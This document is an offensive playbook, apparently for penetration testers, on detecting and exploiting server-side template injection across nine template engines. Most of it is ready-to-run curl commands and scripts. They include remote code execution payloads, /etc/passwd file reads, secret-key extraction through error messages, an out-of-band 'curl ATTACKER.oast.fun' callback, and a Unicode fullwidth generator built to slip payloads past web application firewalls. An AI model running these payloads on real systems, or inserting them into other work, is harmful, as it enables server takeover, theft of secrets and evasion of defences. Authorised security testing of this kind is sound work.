# Playbook: SSTI (Server-Side Template Injection) Testing

## Purpose
Detect and exploit Server-Side Template Injection for remote code execution,
file read, and information disclosure. Covers Jinja2, Twig, Freemarker,
Velocity, Mako, ERB, Pebble, Smarty, and Handlebars engines.
Input: endpoint reflecting user input through a template engine.

---

## Step 1 — Identify Template Injection Points

```
CHECK EACH:
  1. URL parameters reflected in page: /page?name=test
  2. POST body values reflected: email, username, message
  3. HTTP headers reflected: User-Agent, Referer
  4. Error pages with user input in message
  5. PDF/email/report generators (dynamic content)
  6. Custom 404 pages: /USERINPUT → "USERINPUT not found"
  7. Profile fields, comments, feedback forms
```

---

## Step 2 — Detection Probes

```bash
ENDPOINT="https://TARGET/page?name="

# Universal polyglot detection
PROBES=(
  '{{7*7}}'
  '${7*7}'
  '<%= 7*7 %>'
  '#{7*7}'
  '${{7*7}}'
  '{7*7}'
  '{{7*'"'"'7}}'
)

for probe in "${PROBES[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$probe'))")
  RESP=$(curl -sk "${ENDPOINT}${ENCODED}")
  if echo "$RESP" | grep -q "49"; then
    echo "[SSTI DETECTED] Probe: $probe → 49 in response"
  fi
done

# Error-based detection (trigger template error)
curl -sk "${ENDPOINT}%7B%7B%27%27.__class__%7D%7D" | head -20
# If error mentions Jinja2, Twig, etc. → engine identified
```

---

## Step 3 — Engine Identification

```
Decision tree based on probe results:

${7*7} = 49?
  ├── Yes → ${7*'7'} = 7777777?
  │         ├── Yes → Jinja2 or Twig
  │         │         └── {{config}} works? → Jinja2
  │         │         └── {{_self}} works? → Twig
  │         └── No → Unknown (test more)
  └── No → {{7*7}} = 49?
            ├── Yes → {{7*'7'}} = 49?
            │         ├── Yes → Twig
            │         └── No → Jinja2
            └── No → <%= 7*7 %> = 49?
                      ├── Yes → ERB (Ruby)
                      └── No → #{7*7} = 49?
                                ├── Yes → Java (Freemarker/Velocity)
                                └── No → Not SSTI or unknown engine
```

---

## Step 4 — Jinja2 (Python) Exploitation

```bash
ENDPOINT="https://TARGET/page?name="

# Information disclosure
curl -sk "${ENDPOINT}{{config}}"
curl -sk "${ENDPOINT}{{config.items()}}"
curl -sk "${ENDPOINT}{{request.environ}}"

# File read
curl -sk "${ENDPOINT}{{''.__class__.__mro__[1].__subclasses__()}}" | tr ',' '\n' | grep -n "Popen\|FileLoader\|catch_warnings"

# RCE — find subprocess.Popen class index (example: 407)
curl -sk "${ENDPOINT}{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}"

# RCE — alternative via builtins
PAYLOAD="{{request.__class__.__mro__[1].__subclasses__()[0].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}"
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"$PAYLOAD\"))")
curl -sk "${ENDPOINT}${ENCODED}"

# Jinja2 sandbox bypass
curl -sk "${ENDPOINT}{{lipsum.__globals__['os'].popen('id').read()}}"
curl -sk "${ENDPOINT}{{cycler.__init__.__globals__.os.popen('id').read()}}"
```

---

## Step 5 — Twig (PHP) Exploitation

```bash
# Information disclosure
curl -sk "${ENDPOINT}{{_self.env.display('id')}}"
curl -sk "${ENDPOINT}{{app.request.server.all|join(',')}}"

# File read
curl -sk "${ENDPOINT}{{'/etc/passwd'|file_excerpt(1,30)}}"

# RCE (Twig < 1.x)
curl -sk "${ENDPOINT}{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

# RCE (Twig 1.x)
curl -sk "${ENDPOINT}{{['id']|filter('system')}}"

# RCE (Twig 3.x)
curl -sk "${ENDPOINT}{{['id']|map('system')|join}}"
```

---

## Step 6 — Freemarker (Java) Exploitation

```bash
# RCE
curl -sk "${ENDPOINT}<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"

# File read
curl -sk "${ENDPOINT}<#assign f=object?api.class.forName(\"java.io.File\")?new(\"/etc/passwd\")>\${f.toString()}"

# Alternative RCE
curl -sk "${ENDPOINT}\${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
```

---

## Step 7 — Other Engines

```bash
# ERB (Ruby)
curl -sk "${ENDPOINT}<%= system('id') %>"
curl -sk "${ENDPOINT}<%= File.open('/etc/passwd').read %>"

# Velocity (Java)
curl -sk "${ENDPOINT}#set(\$x='')#set(\$rt=\$x.class.forName('java.lang.Runtime'))#set(\$chr=\$x.class.forName('java.lang.Character'))#set(\$str=\$x.class.forName('java.lang.String'))#set(\$ex=\$rt.getRuntime().exec('id'))\$ex"

# Mako (Python)
curl -sk "${ENDPOINT}<%import os;x=os.popen('id').read()%>\${x}"

# Pebble (Java)
curl -sk "${ENDPOINT}{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}{{bytes}}"

# Smarty (PHP)
curl -sk "${ENDPOINT}{system('id')}"

# Handlebars (JS) — limited, usually no RCE
curl -sk "${ENDPOINT}{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
```

---

## Step 8 — Blind SSTI Detection

```bash
# Time-based detection
# Jinja2
curl -sk --max-time 10 "${ENDPOINT}{{range(1000000)|join}}"
# If response is significantly delayed → Jinja2 processing

# OOB detection
curl -sk "${ENDPOINT}{{''.__class__.__mro__[1].__subclasses__()[407]('curl ATTACKER.oast.fun',shell=True,stdout=-1).communicate()}}"
# Check interactsh for callback
```

---

## Output

```
ENDPOINT      : GET /page?name=
ENGINE        : Jinja2 (Python)
DETECTION     : {{7*7}} returned 49 in response body
EXPLOITATION  : {{lipsum.__globals__['os'].popen('id').read()}} → uid=33(www-data)
SEVERITY      : CRITICAL — Remote Code Execution
IMPACT        : Full server compromise, read files, pivot to internal network
EVIDENCE      : [request/response chain from detection to RCE]
```

---

## Step 9 — Error-Based Blind SSTI Exploitation (PortSwigger Top 10 2025 #1)

Reference: "Successful Errors: New Code Injection and SSTI Techniques" by Vladislav Korchagin.

### Concept

Analogous to error-based blind SQL injection, error-based blind SSTI exploits
template engine error messages to extract data even when the rendered output is
not directly reflected to the attacker. The key insight: trigger template engine
errors that leak information through error pages, stack traces, or subtly
different HTTP responses, even when normal output is suppressed or filtered.

### Polyglot Detection Technique

A single polyglot payload can trigger engine-specific errors across multiple
template engines simultaneously. Instead of testing each engine separately,
send one payload and fingerprint the engine from the error behavior.

```bash
ENDPOINT="https://TARGET/page?name="

# Multi-engine polyglot probes — identify engine from error response
POLYGLOTS=(
  '{{__class__}}${T(java.lang.Runtime)}<%=foobar%>#{unknown}${{invalid}}'
  '{{7*7}}${7*7}<%= 7*7 %>#{7*7}{{=7*7}}${{7*7}}{7*7}'
  '{{.}}${.}<%= nil %>${{.}}'
)

for poly in "${POLYGLOTS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$poly'''))")
  RESP=$(curl -sk -w "\n%{http_code}" "${ENDPOINT}${ENCODED}")
  HTTP_CODE=$(echo "$RESP" | tail -1)
  BODY=$(echo "$RESP" | sed '$d')

  echo "--- Polyglot: $poly ---"
  echo "HTTP Status: $HTTP_CODE"

  # Check for engine-identifying error strings
  echo "$BODY" | grep -iE "jinja2|twig|freemarker|velocity|mako|erb|pebble|smarty|handlebars|thymeleaf|TemplateError|TemplateSyntaxError|ParseException" | head -5
done
```

### Error-Based Data Extraction

When direct output is blocked but errors are verbose, force the engine to
include sensitive data inside error messages.

```bash
# Jinja2 — trigger UndefinedError that includes config values
curl -sk "${ENDPOINT}{{config.SECRET_KEY.foobar}}"
# Error: "str object has no attribute 'foobar'" may include the key value in trace

# Jinja2 — force TypeError with data leakage
curl -sk "${ENDPOINT}{{config.SECRET_KEY + []}}"
# Error may read: "can only concatenate str (not 'list') to str" with partial value

# Twig — trigger error containing internal paths
curl -sk "${ENDPOINT}{{_self.env.getLoader().getSourceContext('../../etc/passwd')}}"

# Freemarker — trigger error with class/method enumeration
curl -sk "${ENDPOINT}\${'x'?eval}"
# ParseException output reveals engine version and internal class names

# Blind boolean: compare error vs. no-error to extract data bit by bit
# (true condition renders normally, false condition triggers template error)
curl -sk "${ENDPOINT}{{''.__class__.__mro__[1].__subclasses__()[407] if config.SECRET_KEY[0]=='a' else UNDEFINED}}"
```

### Error Fingerprinting Decision Tree

```
Send polyglot → observe error response:

TemplateSyntaxError / UndefinedError?
  └── Jinja2 (Python)

Twig_Error_Syntax / Twig_Error_Runtime?
  └── Twig (PHP)

freemarker.core.ParseException / InvalidReferenceException?
  └── Freemarker (Java)

org.apache.velocity.exception.*?
  └── Velocity (Java)

SyntaxError in ERB template?
  └── ERB (Ruby)

com.mitchellbosecke.pebble.error.PebbleException?
  └── Pebble (Java)

Smarty Compiler Error?
  └── Smarty (PHP)

org.thymeleaf.exceptions.*?
  └── Thymeleaf (Java)

No error, no output change?
  └── Try time-based blind (Step 8) or OOB
```

---

## Step 10 — Unicode Normalization for WAF Bypass (PortSwigger Top 10 2025 #4)

Reference: Unicode normalization attacks for SSTI WAF evasion by Ryan and
Isabella Barnett.

### Concept

Web Application Firewalls typically match SSTI signatures against normalized
ASCII patterns like `{{`, `}}`, `{%`, `__class__`, `__mro__`, etc. Unicode
normalization (NFC, NFKC, NFKD) performed by the application layer after the
WAF inspection can convert visually different Unicode characters into their
ASCII equivalents, bypassing signature-based detection entirely.

### Unicode Fullwidth Character Bypass

Fullwidth characters (U+FF01 to U+FF5E) normalize to their ASCII counterparts
under NFKC/NFKD normalization. If the application normalizes input after WAF
inspection, fullwidth payloads pass through the WAF untouched but execute as
valid template syntax.

```bash
# Standard payload (blocked by WAF):
# {{config.__class__.__mro__}}

# Fullwidth equivalent (bypasses WAF, normalizes to same payload):
# U+FF5B U+FF5B = {{ (fullwidth left curly brackets)
# U+FF5D U+FF5D = }} (fullwidth right curly brackets)

# Python helper to generate fullwidth SSTI payloads
python3 -c "
def to_fullwidth(s):
    result = []
    for c in s:
        cp = ord(c)
        if 0x21 <= cp <= 0x7E:
            result.append(chr(cp + 0xFEE0))
        else:
            result.append(c)
    return ''.join(result)

payloads = [
    '{{7*7}}',
    '{{config}}',
    '{{config.__class__.__mro__}}',
    '{{lipsum.__globals__[\"os\"].popen(\"id\").read()}}',
]

for p in payloads:
    fw = to_fullwidth(p)
    print(f'Original : {p}')
    print(f'Fullwidth: {fw}')
    print(f'Hex      : {fw.encode(\"utf-8\").hex()}')
    print()
"

# Send fullwidth payload via curl
# (use the hex-encoded UTF-8 bytes directly)
curl -sk "${ENDPOINT}%EF%BD%9B%EF%BD%9B7*7%EF%BD%9D%EF%BD%9D"
```

### Unicode Confusables Bypass

Beyond fullwidth characters, Unicode confusables (visually similar glyphs from
different scripts) can bypass pattern matching while normalizing to expected
ASCII values.

```bash
# Examples of confusable substitutions:
#   _ (U+005F) → ＿ (U+FF3F fullwidth low line)
#   _ (U+005F) → ‗ (U+2017 double low line) — visual confusable
#   . (U+002E) → ． (U+FF0E fullwidth full stop)
#   ' (U+0027) → ＇ (U+FF07 fullwidth apostrophe)
#   ( (U+0028) → ﹙ (U+FE59 small left parenthesis)
#   ) (U+0029) → ﹚ (U+FE5A small right parenthesis)

# Confusable-based Jinja2 RCE payload
python3 -c "
# Mix fullwidth and confusable characters for maximum evasion
payload = (
    '\uFF5B\uFF5B'           # {{
    'lipsum'
    '\uFF0E'                 # .
    '\uFF3F\uFF3Fglobals\uFF3F\uFF3F'  # __globals__
    '\uFF3B'                 # [
    '\uFF07os\uFF07'         # 'os'
    '\uFF3D'                 # ]
    '\uFF0E'                 # .
    'popen'
    '\uFE59'                 # (
    '\uFF07id\uFF07'         # 'id'
    '\uFE5A'                 # )
    '\uFF0E'                 # .
    'read\uFE59\uFE5A'      # read()
    '\uFF5D\uFF5D'           # }}
)
print(f'Payload: {payload}')
print(f'UTF-8 hex: {payload.encode(\"utf-8\").hex()}')
"
```

### Testing WAF Bypass Systematically

```bash
# Step 1: Confirm WAF blocks standard payloads
curl -sk -o /dev/null -w "%{http_code}" "${ENDPOINT}{{7*7}}"
# Expect: 403 or WAF block page

# Step 2: Send fullwidth version
curl -sk -o /dev/null -w "%{http_code}" "${ENDPOINT}%EF%BD%9B%EF%BD%9B7*7%EF%BD%9D%EF%BD%9D"
# Expect: 200 if WAF bypassed

# Step 3: Check if application normalized and executed
curl -sk "${ENDPOINT}%EF%BD%9B%EF%BD%9B7*7%EF%BD%9D%EF%BD%9D" | grep "49"
# If "49" appears → WAF bypassed, SSTI confirmed

# Step 4: Escalate with fullwidth RCE payload
# Use the Python helper above to generate fullwidth versions of Step 4-7 payloads
```

### Normalization Forms to Test

```
Form   When it helps
-----  --------------------------------------------------
NFC    Canonical composition — common in web frameworks
NFKC   Compatibility composition — converts fullwidth to ASCII (most useful)
NFKD   Compatibility decomposition — also converts fullwidth
NFD    Canonical decomposition — less useful for SSTI bypass

Test which form the application uses:
  python3 -c "import unicodedata; print(unicodedata.normalize('NFKC', '\uFF5B\uFF5B7*7\uFF5D\uFF5D'))"
  # Output: {{7*7}} — confirms NFKC normalization converts fullwidth to ASCII
```

---

## Tools Reference

```bash
# tplmap — automatic SSTI scanner
python3 tplmap.py -u "https://TARGET/page?name=*"

# SSTImap (maintained fork)
python3 sstimap.py -u "https://TARGET/page?name=test"

# Nuclei SSTI templates
nuclei -t ssti/ -u "https://TARGET/page?name=FUZZ"
```
